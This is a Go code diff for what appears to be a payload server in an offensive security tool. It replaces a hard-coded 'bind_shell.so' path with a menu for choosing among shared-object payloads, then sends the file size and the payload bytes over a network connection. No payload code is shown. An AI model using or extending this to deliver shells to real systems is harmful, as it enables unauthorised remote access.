@@ -4,11 +4,30 @@ import "net"
 import "fmt"
 import "os"
 import "io/ioutil"
+import "path/filepath"
+import "bufio"
+import "strconv"
+import "strings"
 
 func main(){
 
+	// get list of available payloads
+	payloads, _ := filepath.Glob("../../payloads/*.so")
+
+	// display payload selection menu
+	for i := 0; i < len(payloads); i++{
+		fmt.Println("[", i, "]", payloads[i])
+	}
+	
+	// get user payload selection
+	fmt.Print("Select a payload: ")
+	reader := bufio.NewReader(os.Stdin)
+	input, _ := reader.ReadString('\n')
+	input = strings.Replace(input, "\n", "", -1)
+	index, _ := strconv.Atoi(input)
+	
 	// get file size of payload
-	filestats, _ := os.Stat("../../payloads/bind_shell.so")
+	filestats, _ := os.Stat(payloads[index])
 
 	// get the size
 	filesize := filestats.Size()
@@ -25,7 +44,7 @@ func main(){
 		connection.Write([]byte(fmt.Sprintf("%013d", int(filesize))))
 
 		// get payload data in byte array
-		data, _ := ioutil.ReadFile("../../payloads/bind_shell.so")
+		data, _ := ioutil.ReadFile(payloads[index])
 
 		// transmit payload
 		connection.Write(data)
